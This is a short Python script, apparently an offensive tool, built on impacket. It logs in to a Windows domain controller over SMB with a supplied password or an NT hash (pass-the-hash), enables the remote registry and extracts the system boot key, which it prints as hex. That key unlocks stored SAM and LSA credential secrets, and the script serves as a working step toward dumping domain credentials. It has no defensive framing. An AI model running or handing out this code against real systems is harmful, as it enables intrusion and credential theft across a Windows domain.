from binascii import hexlify
from impacket.smbconnection import SMBConnection 
from impacket.examples.secretsdump import RemoteOperations
import sys

# check if a file name was provided as an argument
if len(sys.argv) != 5:
    print("Usage: Provide 1.DC-hostname 2.Username 3.Password 4.Hash")
    sys.exit(1)

hostname = sys.argv[1]
password = sys.argv[3]
nthash = '' if password else sys.argv[4]
domain = hostname.split('.', 1)[1]
smbConn = SMBConnection( remoteName=hostname, remoteHost=hostname )
smbConn.login(user= sys.argv[2], password=password, domain=domain, nthash=nthash)
remOps = RemoteOperations( smbConnection=smbConn, doKerberos=False)
remOps.enableRegistry( )
bootKey = remOps.getBootKey( )
print(hexlify(bootKey).decode( ) )
remOps.finish()
